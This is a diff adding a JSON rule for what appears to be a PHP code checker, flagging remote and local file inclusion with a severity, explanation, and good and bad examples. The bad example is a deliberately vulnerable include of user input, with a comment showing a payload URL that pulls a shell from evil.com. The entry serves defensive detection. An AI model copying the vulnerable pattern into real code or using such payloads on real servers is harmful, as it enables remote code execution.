@@ -1,0 +1,14 @@
+{
+  "rule_code": "E0070",
+  "title": "E0070: Remote file inclusion",
+  "plain_english": "Using user-controlled input to determine which file to include or require can allow an attacker to load and execute remote or local files on the server.",
+  "why_matters": "Remote file inclusion (RFI) and local file inclusion (LFI) can allow attackers to: - Include and execute PHP code from remote servers - Read sensitive local files - Compromise the server",
+  "bad_example": "$page = $_GET['page'] ?? '';\ninclude $page; // ?page=http://evil.com/shell.txt",
+  "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude __DIR__ . \"/pages/$page.php\";",
+  "severity": "critical",
+  "category": "security",
+  "what_it_checks": [
+    "`include`, `require`, `include_once`, and `require_once` where the path is built from user-controlled input",
+    "`file_get_contents()`, `readfile()`, and `fopen()` with user-controlled file paths from remote sources"
+  ]
+}
